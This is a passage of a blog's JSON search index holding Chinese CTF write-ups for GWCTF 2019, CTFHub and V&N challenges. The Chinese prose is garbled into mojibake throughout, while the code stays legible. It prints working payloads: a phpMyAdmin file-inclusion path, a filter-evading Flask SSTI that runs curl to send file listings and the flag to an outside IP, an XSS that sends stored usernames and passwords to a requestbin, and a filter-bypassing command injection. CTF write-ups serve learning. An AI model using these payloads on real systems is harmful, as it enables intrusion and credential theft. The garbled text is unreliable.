è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œèšå‰‘è¿æ¥ï¼ŒæŸ¥çœ‹phpinfoå‘ç°æ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆå³å¯åˆ©ç”¨è¯¥æ–¹å¼è¿›è¡Œbypass åˆ©ç”¨èšå‰‘æ’ä»¶èšå‰‘è¿æ¥ä¹‹åï¼Œé€‰æ‹©ä¸Šbypassæ’ä»¶ -&gt; é€‰æ‹©æ¨¡å¼ -&gt; GC UAF ç„¶åç‚¹å‡»å¼€å§‹ï¼Œå³å¯æ‹¿åˆ°www-dataæƒé™çš„shellï¼Œåˆ©ç”¨tacå‘½ä»¤å³å¯è¯»åˆ°flagï¼š æ‰‹å·¥bypasså¯ä»¥åˆ©ç”¨è¿™ä¸ªexpè¿›è¡Œ å‚è€ƒï¼šhttps://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass æŒç»­æ›´æ–°ã€‚ã€‚ã€‚","link":"/2020/03/06/CTFHub-bypass-functions-disable/"},{"title":"GWCTF2019å¤ç°","text":"å»å¹´å®‰æ’å†³èµ›ï¼ŒåŒæ—¶è¿˜è¿›è¡Œç€GWCTï¼Œå½“æ—¶æ²¡åšï¼Œç°åœ¨å¤ç°å¤ç°ğŸ’© [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“è€ƒå¯Ÿ[CVE-2018-12613]-PhpMyadminåå°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå‚è€ƒè¿™é‡Œã€‚ è§£é¢˜æ‰«åå°å‘ç°robots.txtå’Œphpmyadminä¸¤ä¸ªé¡µï¼Œè¿›å…¥phpmyadminå‘ç°ç‰ˆæœ¬æ˜¯4.8.1çš„ï¼Œä¸Šé¢è¯´åˆ°çš„æ¼æ´åˆšå¥½æ”¯æŒçš„æ˜¯4.8.0å’Œ4.8.1ï¼Œå› æ­¤æ‹¿payloadå°è¯•ä¸€ä¸‹ï¼Œå‘ç°ç›´æ¥èƒ½æ‰“é€šï¼š index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd é‚£ä¹ˆå†æ„é€ payloadæ‹¿flagå°±è¡Œäº†ï¼š index.php/?target=db_sql.php%253f/../../../../../../../../etc/passwd [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–è€ƒå¯Ÿphpä¼ªéšæœºçš„æ¼æ´ï¼šå¦‚æœmt_srand()ä½¿ç”¨åŒä¸€ä¸ªseedï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥çˆ†ç ´å‡ºseedçš„ã€‚ é¢˜ç›®åˆ†ææŸ¥çœ‹æºç ï¼š $(\"#div1\").load(\"check.php #p1\");$(\".close\").click(function(){ $(\"#myAlert\").hide();}); å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨check.phpï¼Œè®¿é—®è¯¥é¡µé¢å¯ä»¥æ‹¿åˆ°å¦‚ä¸‹æºç ï¼š &lt;?php#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼header(\"Content-Type: text/html;charset=utf-8\");session_start();if(!isset($_SESSION['seed'])){$_SESSION['seed']=rand(0,999999999);}mt_srand($_SESSION['seed']);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo \"&lt;p id='p1'&gt;\".$str_show.\"&lt;/p&gt;\";if(isset($_POST['num'])){ if($_POST['num']===$str){x echo \"&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;\"; } else{ echo \"&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;\"; }}show_source(\"check.php\"); å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨mt_srand()ï¼Œmt_rand()ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”sessionæ˜¯ç”¨çš„éšæœºæ•°è®¾ç½®çš„ï¼Œé‚£ä¹ˆå…ˆå°†ä¼ªéšæœºæ•°è½¬åŒ–ä¸ºphp_mt_seedå¯è¯†åˆ«çš„æ•°æ®ï¼š str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='VJozuuy4YQ'str3 = str1[::-1]length = len(str2)res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprintï¼ˆresï¼‰ ç„¶åç”¨php_mt_seedçˆ†ç ´ä¼ªéšæœºæ•°ï¼š ç„¶ååˆ©ç”¨é¢˜ç›®æºç ï¼Œæ„é€ POCï¼š &lt;?phpmt_srand(980044562);$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";$str='';$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; æŠŠç»“æœè¾“å…¥å³å¯æ‹¿åˆ°flag [GWCTF 2019]ä½ çš„åå­—è€ƒå¯Ÿflaskçš„SSTIï¼Œä»¥åŠåˆ©ç”¨curlåå¼¹shell é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯è¯•äº†å¥½ä¸€ä¼šå„¿æ²¡æœ‰æ•ˆæœï¼ŒæŠ“åŒ…çœ‹è¿”å›å¤´å¯ä»¥å¾—çŸ¥æ˜¯pythonçš„åç«¯ï¼Œå› æ­¤è®¤å®šæ˜¯SSTIã€‚ ç”¨2è¿›è¡Œæµ‹è¯•æ—¶æŠ¥é”™ï¼ŒçŒœæƒ³æ˜¯åŒæ‹¬å·è¢«banäº†ï¼Œåæ¥ç”¨{}ä¸%ç»„åˆçš„æ–¹å¼å¯ä»¥ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…³é”®è¯è¢«banäº†ï¼Œå‚è€ƒåˆ°ä¸€ä½å¸ˆå‚…çš„é¢˜è§£ï¼Œå‘ç°ä»–è®¤ä¸ºåç«¯çš„è¿‡æ»¤æ˜¯è¿™ä¹ˆå†™çš„ï¼š(åº”è¯¥æ˜¯FUZZå‡ºæ¥çš„å§) blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace(no, '') else: breakreturn s è¿™ç§è¿‡æ»¤ï¼Œåˆ©ç”¨é»‘åå•ä¸­æœ€åä¸€ä¸ªè¯è¿›è¡Œæ··æ·†æ¥è¿‡æ»¤æ˜¯æœ€å¥½äº†ï¼Œå³if=&gt;iconfigfï¼Œå› ä¸ºæ˜¯ç”¨é»‘åå•çš„å…³é”®è¯æŒ‰é¡ºåºæ¥å¯¹è¾“å…¥è¿›è¡Œæ›¿æ¢çš„ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ªconfigè¢«æ›¿æ¢ä¹‹åï¼Œè¿‡æ»¤ä¹Ÿå°±ç»“æŸäº†ã€‚ åŒæ—¶è¿˜è¦åˆ©ç”¨VPSæ¥æ¥æ”¶ç»“æœï¼Œåœ¨BUUä¸­å¼€äº†ä¸€å°å†…ç½‘é¶æœºï¼Œæ„é€ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š #è·å–æ–‡ä»¶å{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `ls /`;') %}1{% endiconfigf %} #æ‹¿flag{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://174.0.231.221:1234/ -d `cat /flag_1s_Hera`;') %}1{% endiconfigf %} æˆåŠŸæ‰“å‡ºflagï¼š [GWCTF 2019]mypasswordè€ƒå¯ŸXSS é¢˜ç›®åˆ†ææ³¨å†Œå¹¶ç™»å½•ä¹‹åï¼Œåœ¨feedbacké¡µé¢çœ‹åˆ°äº†ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼ŒæŸ¥çœ‹æºç å¦‚ä¸‹ï¼š if(is_array($feedback)){ echo \"&lt;script&gt;alert('åé¦ˆä¸åˆæ³•');&lt;/script&gt;\"; return false;}$blacklist =['_','\\'','&amp;','\\\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\"\",$feedback); } else{ break; } }} é€šè¿‡è§‚å¯Ÿé»‘åå•ä¸­çš„å†…å®¹ï¼Œåˆæ˜¯ä¸€ä¸ªå¤§å¤§çš„è¾“å…¥æ¡†ï¼ŒæŒ‡å®šæ˜¯XSSäº†ï¼Œå‚è€ƒåˆ«çš„å¸ˆå‚…çš„é¢˜è§£è®²åˆ°æœ¬é¢˜å­˜åœ¨CSPï¼Œä¸èƒ½æ³¨å…¥å¤–éƒ¨çš„JSï¼Œé‚£è‚¯å®šå°±éœ€è¦åœ¨å†…éƒ¨JSä¸ŠåŠ¨æ‰‹è„šï¼Œé€ä¸ªé¡µé¢çœ‹æºç ï¼Œç»“æœåœ¨ç™»é™†é¡µé¢çœ‹åˆ°å­˜åœ¨login.jsï¼Œæºç å¦‚ä¸‹ï¼š if (document.cookie &amp;&amp; document.cookie != '') { var cookies = document.cookie.split('; '); var cookie = {}; for (var i = 0; i &lt; cookies.length; i++) { var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie['user']) != \"undefined\" &amp;&amp; typeof(cookie['psw']) != \"undefined\"){ document.getElementsByName(\"username\")[0].value = cookie['user']; document.getElementsByName(\"password\")[0].value = cookie['psw']; }} è¿™é‡Œè®°ä½å¯†ç åŠŸèƒ½ä¼šä»Cookieä¸­å–å‡ºç”¨æˆ·åå’Œå¯†ç å¹¶èµ‹å€¼ç»™usernameå’Œpasswordï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå†…éƒ¨JSæ¥æ„é€ payloadè¿›è¡ŒXSSï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨BUUçš„requestbinæ¥æ¥å—åé¦ˆã€‚ åœ¨feedbacké¡µé¢æ„é€ å¦‚ä¸‹payloadæäº¤ï¼š &lt;inpcookieut type=\"text\" name=\"username\"&gt;&lt;/inpcookieut&gt;&lt;inpcookieut type=\"text\" name=\"password\"&gt;&lt;/inpcookieut&gt;&lt;scricookiept scookierc=\"./js/login.js\"&gt;&lt;/scricookiept&gt;&lt;scricookiept&gt; var uname = documcookieent.getElemcookieentsByName(\"username\")[0].value; var passwd = documcookieent.getElemcookieentsByName(\"password\")[0].value; var res = uname + \" \" + passwd; documcookieent.locacookietion=\"http://http.requestbin.buuoj.cn/?a=\"+res;&lt;/scricookiept&gt; ç­‰ä¸€æ®µæ—¶é—´ä¹‹åï¼Œå³å¯åœ¨requestbinçœ‹åˆ°å›æ˜¾ï¼š","link":"/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/"},{"title":"CTFHubéƒ¨åˆ†è®°å½•","text":"æŠ€èƒ½æ ‘é‡Œå‡ é“å­¦åˆ°æ–°çŸ¥è¯†çš„é¢˜ç›®çš„è®°å½•ï¼Œè¿˜ä¸é”™è¿˜ä¸é”™ğŸ˜ æŠ€èƒ½æ ‘-web-00æˆªæ–­è¿™ä¸€é¢˜è€ƒå¯Ÿ00æˆªæ–­ï¼Œä½†æ˜¯ä¸æ˜¯å•çº¯åœ°åœ¨æ–‡ä»¶ååç¼€å¤„æˆªæ–­ï¼Œé‚£ç§æ–¹æ³•åªèƒ½ç»•è¿‡å‰ç«¯ï¼Œä½†æ˜¯æœ¬é¢˜åç«¯è¿˜ä¼šæœ‰æ£€æµ‹ï¼Œå› æ­¤éœ€è¦æ„é€ ç»•è¿‡åç«¯æ£€æµ‹çš„æˆªæ–­ã€‚çœ‹åˆ°ç¾¤é‡Œæœ‰äº›å¸ˆå‚…é—®ä¸€äº›çˆ†ç ´æ–‡ä»¶åä¹‹ç±»é—®é¢˜â€¦æ„Ÿè§‰è¿˜æ˜¯å†™ä¸€ä¸‹é¢˜è§£å§ï¼Œå¸Œæœ›èƒ½æœ‰å¸®åŠ©ï¼Œè‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ã€‚ï¼ˆä¸ºäº†å†™é¢˜è§£ï¼ŒåˆèŠ±30é‡‘å¸â€¦LinEå¸ˆå‚…æ±‚æŠ¥é”€å•Šï¼‰ é¢˜ç›®åˆ†ææ‹¿åˆ°é¢˜ç›®å…ˆçœ‹çœ‹æºç ï¼š if (!empty($_POST['submit'])) { $name = basename($_FILES['file']['name']); $info = pathinfo($name); $ext = $info['extension']; $whitelist = array(\"jpg\", \"png\", \"gif\"); if (in_array($ext, $whitelist)) { $des = $_GET['road'] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext; if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) { echo \"&lt;script&gt;alert('ä¸Šä¼ æˆåŠŸ')&lt;/script&gt;\"; } else { echo \"&lt;script&gt;alert('ä¸Šä¼ å¤±è´¥')&lt;/script&gt;\"; } } else { echo \"æ–‡ä»¶ç±»å‹ä¸åŒ¹é…\"; }} é€šè¿‡å®¡è®¡å¯çŸ¥ï¼Œä»£ç çš„é€»è¾‘å¦‚ä¸‹ï¼š 1ã€é¦–å…ˆå–åˆ°ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å$ext 2ã€å°†æ‰©å±•åä¸ç™½åå•è¿›è¡ŒåŒ¹é…ï¼Œä¸ºjpgã€pngæˆ–gifæ‰èƒ½é€šè¿‡ç¬¬ä¸€æ¬¡è¿‡æ»¤ 3ã€æ‰©å±•ååŒ¹é…ä¹‹åï¼Œä¸ºä¸Šä¼ çš„æ–‡ä»¶æ„é€ äº†ä¸€ä¸ªæ–°çš„å­˜å‚¨è·¯å¾„$desï¼Œè¿™ä¸ªåœ°æ–¹ç”¨äº†rand()å‡½æ•°ï¼Œå°±çœ‹åˆ°æœ‰äº›å¸ˆå‚…é—®æ˜¯ä¸æ˜¯è¦çˆ†ç ´â€¦çœ‹åˆ°åé¢çš„$extæ€ä¹ˆèƒ½æƒ³ç€çˆ†ç ´å‘¢ï¼Ÿè¿™æ˜¯æ­£å¸¸ä¸Šä¼ å›¾ç‰‡çš„å­˜å‚¨è·¯å¾„ï¼Œäººå®¶åç¼€éƒ½æ˜¯é€šè¿‡åŒ¹é…çš„$extï¼Œè‡ªå·±çš„å°é©¬è‚¯å®šæ˜¯phpå•Šâ€¦ è¿™é¢˜æ˜¯è€ƒå¯Ÿ00æˆªæ–­çš„ï¼Œçªç ´ç‚¹ä¹Ÿå¾ˆæ˜æ˜¾äº†ï¼šæ„é€ $desçš„æ—¶å€™ï¼Œé¦–å…ˆå–çš„æ˜¯roadå‚æ•°çš„å†…å®¹/var/www/html/upload/ï¼Œæƒ³åˆ°çœ‹åˆ°çš„ç»•è¿‡åç«¯æ£€æµ‹çš„ä¸€ç¯‡æ–‡ç« ï¼Œéœ€è¦åœ¨å­˜å‚¨è·¯å¾„çš„åœ°æ–¹æ„é€ æˆªæ–­ï¼š/var/www/html/upload/shell.php%00ã€‚è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼šå­˜å‚¨è·¯å¾„åé¢è¦åŠ ä¸€ä¸ªphpåç¼€çš„æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨%00è¿›è¡Œæˆªæ–­ï¼Œè¿™æ ·ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹å°±å­˜åˆ°äº†shell.phpé‡Œï¼Œè¿˜è¦æ³¨æ„è¦ç”¨%00æˆªæ–­ï¼Œç”±äºå†…å®¹åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç›´æ¥åœ¨hexä¸­æ”¹00ä¼šæŠ¥bad requestã€‚ è§£é¢˜æŠ“åŒ…æ”¹åŒ…å¦‚ä¸‹ï¼šæˆåŠŸä¸Šä¼ ï¼Œèšå‰‘è¿æ¥url/var/www/html/upload/shell.phpå³å¯ã€‚ å‘½ä»¤æ³¨å…¥-ç»¼åˆä¸€ä¸ªè€ƒå¯Ÿç‚¹æ¯”è¾ƒå…¨é¢ï¼Œä½†æ˜¯ä¹Ÿæ˜¯æ¯”è¾ƒå…¥é—¨çš„é¢˜ç›®ã€‚ä¸»è¦è€ƒå¯Ÿäº†å¯¹è¿æ¥ç¬¦ã€ç‰¹æ®Šæ–‡ä»¶åã€è¯»å–æ–‡ä»¶å‘½ä»¤ç­‰è¿‡æ»¤çš„ç»•è¿‡ã€‚è¿™ä¸ªé¢˜è§£é¢˜çš„æ—¶å€™èµ°äº†ä¸€å¤§åœˆå¼¯è·¯ï¼Œå¹¶ä¸”è¿˜æ’åˆ°äº†å¢™ä¸Šï¼Œåæ¥ç”¨æ­£å¸¸å§¿åŠ¿è§£äº†å‡ºæ¥â€¦ é¢˜ç›®åˆ†ææ—¢ç„¶æ¯”è¾ƒç»¼åˆï¼Œå…ˆçœ‹çœ‹æºç ï¼š &lt;?php$res = FALSE;if (isset($_GET['ip']) &amp;&amp; $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) { $cmd = \"ping -c 4 {$ip}\"; exec($cmd, $res); } else { $res = $m; }}?&gt; å¯ä»¥çœ‹åˆ°å¯¹ipä¼ å‚å†…å®¹ä¸­çš„è¿æ¥ç¬¦ã€ç©ºæ ¼ã€catå‘½ä»¤ã€flagå­—æ®µè¿›è¡Œäº†è¿‡æ»¤ï¼Œå¯¹ç©ºæ ¼è¿‡æ»¤å¾ˆç®€å•ï¼Œ${IFS}å°±è¡Œï¼Œä¹‹å‰çš„ä¸€ç¯‡åšå®¢ä¹Ÿå†™è¿‡ï¼Œå¯¹catå’Œflagçš„è¿‡æ»¤ä¹Ÿå¾ˆç®€å•ï¼Œç”¨\\å³å¯ç»•è¿‡ï¼šca\\t f\\lagï¼Œå…³é”®å°±åœ¨äºå¯¹|ã€&amp;ã€;ä¸‰ä¸ªè¿æ¥ç¬¦çš„è¿‡æ»¤ï¼Œæœ€åˆæ²¡æœ‰è€ƒè™‘æ˜¯GETä¼ å‚ï¼Œå¿˜è®°äº†ç”¨%0aä»£æ›¿;ï¼Œè€Œæ˜¯é€‰æ‹©ç”¨8/16è¿›åˆ¶è¿›è¡Œç»•è¿‡ï¼Œä»è€Œè·³è¿›äº†å¤§å‘â€¦è¿™ç§æ–¹æ³•æ„é€ æ€è·¯å°±æ˜¯ï¼šåˆ©ç”¨å­—ç¬¦çš„asciiç å¯¹åº”çš„8/16è¿›åˆ¶è¡¨ç¤ºå­—ç¬¦ï¼Œç»“åˆprintfå‘½ä»¤è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç„¶ååˆ©ç”¨$å°†å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œæ¯”å¦‚ï¼š lsï¼š$(printf${IFS}\"\\154\\163\") ä½†æ˜¯æ„é€ çš„payloadä¸€ç›´æ²¡æ‰“é€šï¼Œäºæ˜¯æœ¬åœ°æµ‹äº†ä¸€ä¸‹ï¼šåŸæ¥æ˜¯è¾“å‡ºçš„å†…å®¹è¢«å½“ä½œipçš„ä¸€éƒ¨åˆ†äº†â€¦ ä½†æ˜¯æ²¡ææ‡‚ä¸ºå•¥è¿™æ ·æ„é€ å‡ºæ¥çš„å­—ç¬¦ä¼šè¢«å½“åšå‰é¢å‘½ä»¤çš„ä¸€éƒ¨åˆ†â€¦ è§£é¢˜ç”±äºæ˜¯GETä¼ å‚ï¼Œåˆ©ç”¨è¿æ¥ç¬¦çš„urlç¼–ç å°±èƒ½ç»•è¿‡ï¼Œæ¯”å¦‚;å¯¹åº”%0aï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š ip=127.0.0.1%0acd${IFS}fl\\ag_is_here%0aca\\t${IFS}fl\\ag_64331483515023.php å³å¯æ‹¿åˆ°flagï¼šè¿™é‡Œçš„catå…¶å®è¿˜å¯ä»¥ç”¨moreã€lessã€tailã€sortå‘½ä»¤æ›¿æ¢ï¼Œå…·ä½“å¯ä»¥æŸ¥ä¸€ä¸‹å‡ ä¸ªå‘½ä»¤çš„åŒºåˆ«ã€‚å¯¹æ–‡ä»¶åçš„è¿‡æ»¤ä¹Ÿå¯ä»¥é€šè¿‡åˆ©ç”¨å˜é‡çš„å½¢å¼æ¥ç»•è¿‡ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šä¾‹å­å¯ä»¥å‚è€ƒï¼Œè¿™é‡Œä¸å†å†™äº†ã€‚ å…³äºæ›´å¤šå‘½ä»¤æ³¨å…¥çš„ç»•è¿‡å§¿åŠ¿å¯ä»¥å‚è€ƒè¿™é‡Œã€‚","link":"/2020/03/03/CTFHub%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/"},{"title":"V&Nå…¬å¼€èµ›","text":"éš”ç¦»åœ¨å®¶æ— äº‹åšï¼Œæ‰“æ‰“æ¯”èµ›ä¹è¶£å¯»~ å§æ§½ï¼æ¯•è®¾è¿˜æ²¡å¼€å§‹ï¼Ÿï¼ğŸ¤¨ TimeTravelè€ƒå¯ŸCVE-2016-5385ï¼šå¯ä»¥ç†è§£ä¸ºä¼ªé€ ä»£ç†å§ã€‚ é¢˜ç›®åˆ†æ&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) { $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} å®¡è®¡ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†Guzzleï¼š Guzzleæ˜¯ä¸€ä¸ªä½¿å¾—åˆ©ç”¨PHPå®ç°å‘é€HTTPè¯·æ±‚ï¼Œæ–¹ä¾¿å’Œweb serviceé›†æˆçš„PHPå®¢æˆ·ç«¯æ¨¡æ‹Ÿç»„ä»¶ã€‚ä¸€å¥è¯ï¼Œå®ƒå°±åƒä¸€ä¸ªPHPå†™çš„æµè§ˆå™¨ã€‚å½“ä½ çš„æœåŠ¡ç«¯ç¨‹åºéœ€è¦ä½œä¸ºå®¢æˆ·ç«¯æ¥è®¿é—®å…¶ä»–çš„serviceæœåŠ¡æ—¶ï¼Œè¿™å°±æ˜¯ä½ æ‰€éœ€è¦çš„ã€‚ç®€å•çš„æ¥å£æ„å»ºquery stringï¼ŒPOST requests,streaming large uploads/downloads,ä½¿ç”¨HTTP cookies,ä¸Šä¼ json dataç­‰ã€‚ æ ¹æ®ä»£ç é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡flagä¼ å‚æ¥æ‹¿åˆ°flagï¼Œä½†æ˜¯æ˜¯é€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªclient()ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªclientå»è®¿é—®æœ¬åœ°5000ç«¯å£ä¸‹çš„/api/eligibleæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œå°†è¿”å›çš„jsonæ•°æ®è§£ç ä¹‹åï¼Œå¦‚æœå­—æ®µé‡Œçš„successä¸ºtrueï¼Œå³å¯æ‹¿åˆ°flagã€‚ å…³é”®å°±åœ¨äº$client-&gt;get('http://127.0.0.1:5000/api/eligible')ï¼Œé¢˜ç›®æœåŠ¡å™¨ä¸Šè‚¯å®šæ˜¯æ²¡æœ‰è¿™ä¸ªäº†ï¼Œæƒ³è¦å®ç°è¦ä¹ˆå¯ä»¥é€šè¿‡æ‹¿åˆ°shellå†™å…¥ï¼Œè¦ä¹ˆå°±æ˜¯ä»£ç†åˆ°VPSä¸Šã€‚é€šè¿‡phpinfoå¯ä»¥çœ‹åˆ°ï¼Œæ¥å£ç”¨çš„æ˜¯fastCGIï¼šæ‰¾åˆ°çš„CVE-2016-5385å°±æ˜¯é€šè¿‡CGIæ¥ä¼ªé€ ä»£ç†ï¼Œå¤§è‡´åŸç†ï¼š cgi(fastcgi)è¦å°†ç”¨æˆ·ä¼ å…¥çš„æ‰€æœ‰HTTPå¤´éƒ½åŠ ä¸ŠHTTP_å‰ç¼€æ”¾å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œè€Œæ°å¥½å¤§å¤šæ•°ç±»åº“çº¦å®šä¿—æˆä¼šæå–ç¯å¢ƒå˜é‡ä¸­çš„HTTP_PROXYå€¼ä½œä¸ºHTTPä»£ç†åœ°å€ã€‚äºæ˜¯ï¼Œæ¶æ„ç”¨æˆ·é€šè¿‡æäº¤Proxy: http://evil.comè¿™æ ·çš„HTTPå¤´ï¼Œå°†ä½¿ç”¨ç¼ºé™·ç±»åº“çš„ç½‘ç«™çš„ä»£ç†è®¾ç½®ä¸ºhttp://evil.comï¼Œè¿›è€Œçªƒå–æ•°æ®åŒ…ä¸­å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ã€‚ äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç†ä¸€ä¸‹è§£é¢˜æ€è·¯äº†ï¼š 1ã€åœ¨VPSä¸Šæ„é€ /api/eligible/index.phpï¼Œå¹¶ä¸”è¯»å–åˆ°çš„ç»“æœè¦åŒ…å«{â€œsuccessâ€:true}ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢çš„index.phpçš„ä»£ç  2ã€åˆ©ç”¨php -S localhost:5000åœ¨VPSä¸Šæ‰“å¼€webæœåŠ¡çš„ç«¯å£ï¼Œæ³¨æ„ï¼šåœ¨åŒ…å«/api/eligible/index.phpçš„æ–‡ä»¶å¤¹ä¸‹å¼€å¯webæœåŠ¡ 3ã€é€šè¿‡flagä¼ å‚ï¼ŒæŠ“åŒ…ï¼Œåœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥ï¼šhttp://ip:portï¼Œæ­¤å¤„çš„ipæ˜¯VPSçš„ip(ç”±äºBUUè¦æ±‚å†…ç½‘ç¯å¢ƒï¼Œè¿™é‡Œå°±å¡«å†…ç½‘æœºå™¨çš„ip)ï¼Œportä¸ºVPSä¸Šä¸€ä¸ªå¼€å¯çš„ç«¯å£ï¼Œå¯ä»¥åˆ©ç”¨php -Så‘½ä»¤å¼€å¯ä¸¤ä¸ªwebæœåŠ¡ç«¯å£æ¥è¿›è¡Œ //index.php&lt;?php$data = array();$data['success'] = true; $json_string = json_encode($data);echo $json_string; ?&gt; ç”±äºBUUä¸Šéœ€è¦ç”¨å†…ç½‘ï¼Œå°±åœ¨BUUä¸­å¼€äº†ä¸€ä¸ªå†…ç½‘ç¯å¢ƒä½œä¸ºVPSï¼šå¦‚æ­¤ä»¥æ¥ï¼ŒVPSå°±æˆä¸ºä»£ç†äº†ï¼Œåé¢çš„$client-&gt;get('http://127.0.0.1:5000/api/eligible')ä¹Ÿå°±åœ¨VPSä¸Šæ‰§è¡Œäº†ï¼Œä»è€Œæ‰¾åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œè¿”å›{â€œsuccessâ€:true}ï¼Œè¿›è€Œé€šè¿‡åé¢çš„åˆ¤æ–­ï¼Œæ‹¿åˆ°flagã€‚ CHECKINè€ƒå¯Ÿåˆ©ç”¨perlæˆ–pythonåå¼¹shellï¼Œé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–è¢«åˆ é™¤çš„æ–‡ä»¶å†…å®¹ã€‚ é¢˜ç›®åˆ†æé¢˜ç›®æºç å¦‚ä¸‹ï¼š from flask import Flask, request import os app = Flask(__name__) flag_file = open(\"flag.txt\", \"r\") # flag = flag_file.read() # flag_file.close() # @app.route('/flag') # def flag():# return flag#want flag? naive! # You will never find the thing you want:) I think @app.route('/shell') def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\" @app.route('/') def source(): return open(\"app.py\",\"r\").read() if __name__ == \"__main__\": app.run(host='0.0.0.0') å¯ä»¥çœ‹åˆ°ï¼Œflagæ–‡ä»¶é¦–å…ˆè¢«è¯»å–äº†ï¼Œè¯»å–æ–‡ä»¶çš„è¿›ç¨‹åœ¨å†…å­˜ä¸­æ˜¯å­˜åœ¨çš„ï¼Œå› æ­¤å½“æˆ‘ä»¬é€šè¿‡/shell?c=æ¥ä¼ å…¥å‘½ä»¤çš„æ—¶å€™ï¼Œè™½ç„¶ä¼šå…ˆåˆ 